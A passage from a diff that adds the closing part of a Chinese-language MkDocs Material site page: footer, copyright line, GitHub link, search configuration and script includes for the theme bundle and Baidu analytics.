+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2017 - 2022
+    </div>
+  
+  <a >keep learning ，stay foolish ，continue thinking</a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    <a href="https://github.com/klsfct" target="_blank" rel="noopener" title="圆周 on github" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "header.autohide"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.960e086b.min.js"></script>
+      
+        <script src="../../js/baidu-tongji.js"></script>
+      
+    
+  </body>
+</html>
